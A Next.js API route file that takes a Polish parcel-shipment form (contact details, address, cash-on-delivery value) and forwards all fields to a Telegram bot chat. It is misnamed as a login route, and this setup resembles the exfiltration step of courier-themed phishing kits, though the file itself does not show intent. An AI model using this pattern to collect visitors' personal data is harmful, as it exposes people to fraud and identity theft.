// src/app/api/users/login/route.ts
import { NextRequest, NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: NextRequest) {
  const body = await req.json(); // <-- this parses the JSON body!
  const { typeOfShipment, packageSize, email, telephone, name, companyName, postCode, town, street, buildingNumber, premisesNumber, pickupPoint,downloadValue, additionalProtection, packageOnWeekend, transferShipment } =
    body;

  // Telegram Bot credentials
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  const message = `Form Submission :\nWybierz rodzaj przesyłki: ${typeOfShipment}\nWybierz rozmiar paczki: ${packageSize}\nAdres e-mail: ${email}\nNumer telefonu: ${telephone}\nPunkt odbioru: ${pickupPoint}\nImię i nazwisko: ${name}\nNazwa firmy: ${companyName}\nKod pocztowy: ${postCode}\nMiejscowość: ${town}\nUlica: ${street}\nNumer budynku: ${buildingNumber}\nNumer lokalu: ${premisesNumber}\nWartość pobrania: ${downloadValue}\nDodatkowa ochrona: ${additionalProtection}\nPaczka w Weekend: ${packageOnWeekend}\nWybierz sposób przekazania przesyłki: ${transferShipment}`;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }
    );
    return NextResponse.json({ ok: true });
  } catch (error) {
    if (axios.isAxiosError(error)) {
      console.error("Login failed:", error.response?.data || error.message);
    } else if (error instanceof Error) {
      console.error("Login Error:", error.message);
    } else {
      console.error("An unexpected error occurred during login");
    }
    return NextResponse.json(
      { error: "Failed to send to Telegram" },
      { status: 500 }
    );
  }
}
